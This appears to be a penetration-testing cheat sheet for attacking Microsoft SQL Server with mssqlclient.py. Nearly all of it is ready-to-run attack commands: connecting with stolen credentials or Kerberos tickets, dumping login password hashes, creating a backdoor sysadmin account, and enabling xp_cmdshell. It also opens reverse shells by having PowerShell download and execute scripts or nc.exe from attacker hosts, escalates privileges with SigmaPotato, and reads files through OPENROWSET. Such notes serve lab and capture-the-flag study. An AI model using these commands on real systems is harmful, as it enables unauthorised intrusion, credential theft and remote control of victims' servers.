---
description: >-
  https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
---

# mssqlclient

### Connection

{% code overflow="wrap" %}
```bash
mssqlclient.py [-db volume] <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>

# Example
mssqlclient.py username:password@10.10.10.143
mssqlclient.py sa:EjectFrailtyThorn425@192.168.83.70 -port 1435
mssqlclient.py -db volume -windows-auth DOMAIN/USERNAME:PASSWORD@10.10.10.143 
mssqlclient.py manager.htb/operator:operator@manager.htb -dc-ip dc01.manager.htb -windows-auth

# Kerberos
export KRB5CCNAME=./Administrator.ccache
mssqlclient.py -k BREACHDC.breach.vl
```
{% endcode %}

### Common Commands

```bash
# Get version
SQL>SELECT @@version;

# Get user
SQL>SELECT user_name();

# Get databases
SQL>SELECT name FROM master.dbo.sysdatabases
SQL>SELECT name FROM master..sysdatabases

# Use database
SQL>USE master

#Get table names
SQL>SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES
SQL>SELECT * FROM master.INFORMATION_SCHEMA.TABLES

# Extract data
SQL>SELECT * FROM <table names> 

#List users
SQL>SELECT sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;

#Create user with sysadmin privs
SQL>CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'
SQL>EXEC sp_addsrvrolemember 'hacker', 'sysadmin'
```

### Command Execution

```bash
# Check if you can run commands
SQL> xp_cmdshell "whoami"

SQL> SP_CONFIGURE "xp_cmdshell", 1
SQL> RECONFIGURE
SQL> SP_CONFIGURE "show advanced options", 1
SQL> RECONFIGURE

# or run the following command
SQL> enable_xp_cmdshell

SQL> xp_cmdshell systeminfo
```

### Reverse shell - netcat&#x20;

{% code overflow="wrap" %}
```bash
# Kali
nc -nlvp 1234

# Powershell with Nishang
SQL> xp_cmdshell powershell.exe IEX(New-Object Net.webclient).downloadString(\"http://192.168.49.83/shell.ps1\")

# Netcat 
SQL> xp_cmdshell "powershell.exe wget http://192.168.1.2/nc.exe -OutFile c:\\Users\Public\\nc.exe"
SQL> xp_cmdshell  "c:\\Users\Public\\nc.exe -e cmd.exe 192.168.1.2 1234"

# Netcat with SMB file share
SQL> xp_cmdshell \\192.168.49.83\smb\nc64.exe -nv 192.168.49.83 1234 -e cmd.exe


```
{% endcode %}

### Reverse shell - SigmaPotato

{% code overflow="wrap" %}
```bash
# SigmaPotato example for SeImpersonate privilege 
# cat shell.ps
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://10.8.0.251/privesc/SigmaPotato.exe"))
[SigmaPotato]::Main(@("--revshell","10.8.0.251","445"))

# Set up a web server
Kali> sudo python -m http.server 80

# Set up a netcat listner
Kali> rlwrap nc -nlvp 445

# Run xp_cmdshell command at Target Machine 
SQL> EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.8.0.251/shell.ps1") | powershell -noprofile'
```
{% endcode %}

###

### Read files

{% code overflow="wrap" %}
```bash
SQL> SELECT * FROM OPENROWSET(BULK N'C:/Users/Administrator/Desktop/root.txt', SINGLE_CLOB) AS Contents
```
{% endcode %}
